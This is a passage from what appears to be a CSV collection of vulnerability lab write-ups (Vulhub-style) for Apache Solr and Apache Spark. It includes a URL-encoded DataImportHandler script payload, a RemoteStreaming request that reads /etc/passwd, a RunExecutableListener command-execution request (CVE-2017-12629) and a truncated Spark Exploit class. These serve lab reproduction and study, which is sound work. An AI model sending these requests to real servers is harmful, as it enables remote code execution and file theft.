command=full-import&verbose=false&clean=false&commit=true&debug=true&core=demo&dataConfig=%3CdataConfig%3E%0A++%3Cscript%3E%3C!%5BCDATA%5B%0A++++++++++function+poc()%7B+java.lang.Runtime.getRuntime().exec(%22touch+%2Ftmp%2Fsuccess%22)%3B%0A++++++++++%7D%0A++%5D%5D%3E%3C%2Fscript%3E%0A++%3Cdocument%3E%0A++++%3Centity+name%3D%22sample%22%0A++++++++++++fileName%3D%22.*%22%0A++++++++++++baseDir%3D%22%2F%22%0A++++++++++++processor%3D%22FileListEntityProcessor%22%0A++++++++++++recursive%3D%22false%22%0A++++++++++++transformer%3D%22script%3Apoc%22+%2F%3E%0A++%3C%2Fdocument%3E%0A%3C%2FdataConfig%3E&name=dataimport


Execute docker compose exec solr ls /tmp to enter the container, and you can see that touch /tmp/success has been successfully executed:
-------------------------------------------------------------------------------","https://mp.weixin.qq.com/s/typLOXZCev_9WH_Ux0s6oA
https://paper.seebug.org/1009/
http://your-ip:8983
http://your-ip:8983/solr/"
solr,Unknown,Apache Solr RemoteStreaming Arbitrary File Reading and SSRF,"Apache Solr RemoteStreaming Arbitrary File Reading and SSRF

中文版本(Chinese version)

Apache Solr is an open-source search server. When Apache Solr does not have authentication enabled, an attacker can craft a request to enable specific configurations, potentially leading to Server-Side Request Forgery (SSRF) or arbitrary file reading vulnerabilities.

References:
<https://mp.weixin.qq.com/s/3WuWUGO61gM0dBpwqTfenQ

Environment Setup

Execute the following command to start an Apache Solr 8.8.1 server:


docker compose up -d


After the server starts, you can access the Apache Solr management interface at http://your-ip:8983/.

Vulnerability Reproduction

First, visit http://your-ip:8983/solr/admin/cores?indexInfo=false&wt=json to extract the database name:



Send the following request to modify the configuration of the demo core and enable RemoteStreaming:


curl -i -s -k -X $'POST' \
H $'Content-Type: application/json' --data-binary $'{\""set-property\"":{\""requestDispatcher.requestParsers.enableRemoteStreaming\"":true}}' \
     $'http://your-ip:8983/solr/demo/config'




Then, you can read arbitrary files through the stream.url parameter:


curl -i -s -k 'http://your-ip:8983/solr/demo/debug/dump?param=ContentStreams&stream.url=file:///etc/passwd'
-------------------------------------------------------------------------------",https://mp.weixin.qq.com/s/3WuWUGO61gM0dBpwqTfenQ
solr,CVE-2017-12629,Apache Solr Remote Command Execution (CVE-2017-12629),"Apache Solr Remote Command Execution (CVE-2017-12629)

中文版本(Chinese version)

Apache Solr is an open-source search server. It is written in Java and built upon Apache Lucene. Before version 7.1.0, two vulnerabilities were discovered: XML External Entity (XXE) and Remote Command Execution (RCE), both numbered as CVE-2017-12629. These two vulnerabilities can be chained together to form an attack chain.

This environment demonstrates the RCE vulnerability.

References:
<https://www.exploit-db.com/exploits/43009/
<https://paper.seebug.org/425/

Environment Setup

Execute the following command to start an Apache Solr 7.0.1 server:


docker compose up -d


After the server starts, you can access the Apache Solr management interface at http://your-ip:8983/. No authentication is required.

Vulnerability Reproduction

First, create a listener by setting the exe value to the command you want to execute and the args value to the command parameters:


POST /solr/demo/config HTTP/1.1
Host: your-ip
Accept: /
Accept-Language: en
User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
Connection: close
Content-Length: 158

{""add-listener"":{""event"":""postCommit"",""name"":""newlistener"",""class"":""solr.RunExecutableListener"",""exe"":""sh"",""dir"":""/bin/"",""args"":[""-c"", ""touch /tmp/success""]}}




Then, trigger the listener by performing an update operation:


POST /solr/demo/update HTTP/1.1
Host: your-ip
Accept: /
Accept-Language: en
User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
Connection: close
Content-Type: application/json
Content-Length: 15

[{""id"":""test""}]




Execute docker compose exec solr bash to enter the container, and you can see that /tmp/success has been successfully created:
-------------------------------------------------------------------------------","https://www.exploit-db.com/exploits/43009/
https://paper.seebug.org/425/"
spark,Unknown,Apache Spark Unauthorized Access Leads to Remote Code Execution,"Apache Spark Unauthorized Access Leads to Remote Code Execution

中文版本(Chinese version)

Apache Spark is a cluster computing system that allows users to submit applications to the management node for cluster execution. If the management node has not enabled ACL (Access Control List), it becomes possible to execute arbitrary code in the cluster.

Reference links:
https://weibo.com/ttarticle/p/show?id=2309404187794313453016
https://xz.aliyun.com/t/2490

Vulnerability Environment

Execute the following command to start an Apache Spark cluster in standalone mode, which includes one master and one slave:


docker compose up -d


After the environment starts, visit http://your-ip:8080 to access the master's management page, and http://your-ip:8081 to access the slave's management page.

Vulnerability Reproduce

The essence of this vulnerability is that unauthorized users can submit an application to the management node, where this application is actually malicious code.

There are two ways to submit applications:

1. Using REST API
2. Using submissions gateway (integrated in port 7077)

The application can be written in Java or Python. Here's a simple example class (from reference link 1):

java
import java.io.BufferedReader;
import java.io.InputStreamReader;

public class Exploit {
  public static void main(String[] args) throws Exception {
    String[] cmds = args[0].split("","");

    for (String cmd : cmds) {
      System.out.println(cmd);
      System.out.println(executeCommand(cmd.trim()));
      System.out.println(""","https://weibo.com/ttarticle/p/show?id=2309404187794313453016
https://xz.aliyun.com/t/2490"